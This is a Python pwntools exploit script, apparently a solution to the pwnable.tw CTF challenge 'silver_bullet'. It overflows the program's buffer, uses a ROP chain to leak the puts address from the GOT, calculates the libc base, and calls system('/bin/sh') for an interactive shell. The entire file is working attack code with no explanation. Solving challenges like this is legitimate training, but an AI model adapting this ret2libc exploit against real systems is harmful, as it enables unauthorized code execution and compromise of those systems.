#!/usr/bin/python

from pwn import *
import sys

try:
    if sys.argv[1] == 'remote':
        p = remote('chall.pwnable.tw', 10103)
        libc = ELF('./libc_32.so.6')
except:
    p = process('./silver_bullet')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')

e = ELF('./silver_bullet')

context.binary = e

p.recv()


def create_bullet(payload):
    p.sendline("1")
    p.sendafter("bullet :", payload)
    p.recv()

def power_up(payload):
    p.sendline('2')
    p.sendafter('bullet :',payload)
    p.recv()

def beat():
    p.sendline('3')
    p.recvuntil('Try to beat it .....\n')

create_bullet("A"*47)
power_up("A")

rop = ROP(e)
rop.call('puts', [e.got['puts']])
rop.call('main')
power_up("A"*7+str(rop))

beat()
p.recv()
beat()

p.recvuntil('Oh ! You win !!\n')


puts_addr = u32(p.recv(4))
libc_base = puts_addr -libc.symbols['puts']
log.info("LIBC BASE:{}".format(hex(libc_base)))
system_addr = libc_base + libc.symbols['system']
log.info("SYSTEM ADDR:{}".format(hex(system_addr)))
bin_sh = libc_base + libc.search("/bin/sh").next()

create_bullet("B"*47)
power_up("B")

rop_final = ROP(e)
rop_final.call(system_addr, [bin_sh])
power_up("B"*7+str(rop_final))

beat()
p.recv()
beat()


p.interactive()
